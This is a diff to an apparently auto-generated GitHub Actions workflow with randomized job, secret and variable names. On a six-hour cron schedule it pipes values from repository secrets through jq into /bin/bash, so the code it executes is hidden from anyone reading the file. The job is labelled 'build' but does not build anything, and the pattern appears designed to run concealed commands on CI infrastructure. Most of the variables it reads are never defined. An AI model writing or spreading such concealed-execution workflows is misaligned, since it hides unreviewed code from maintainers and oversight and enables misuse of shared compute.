@@ -2,27 +2,19 @@ name: liuyidao4657
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 1/6 * * *'
+    - cron: '31 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: liuyidao4657
         env:
-          voqn0: ${{ secrets.voqn0 }}
+          zcpv4: ${{ secrets.zcpv4 }}
         run: |
-          echo $voqn0 | jq -r .xrfi5594 | /bin/bash
-          echo $lqoml9658 | jq -r .zkdv67575 | /bin/bash
-          echo $oaboy01 | jq -r .yamqr57332 | /bin/bash
-          echo $q5 | jq -r .p5370 | /bin/bash
-          echo $qc59 | jq -r .krmv0304 | /bin/bash
-          echo $umkc10287 | jq -r .ckpl99 | /bin/bash
-          echo $e3 | jq -r .kpav98963 | /bin/bash
-          echo $lbny6 | jq -r .tw127 | /bin/bash
-          echo $zgdzb0390 | jq -r .yhpku1 | /bin/bash
-          echo $iocs285 | jq -r .lrwz72807 | /bin/bash
-          echo $jsyd37 | jq -r .ujm859 | /bin/bash
+          echo $zcpv4 | jq -r .ay17203 | /bin/bash
+          echo $xl9 | jq -r .lklfr97 | /bin/bash
+          echo $a4666 | jq -r .iuc543 | /bin/bash
+          echo $mefz828 | jq -r .hiqjr7476 | /bin/bash
 
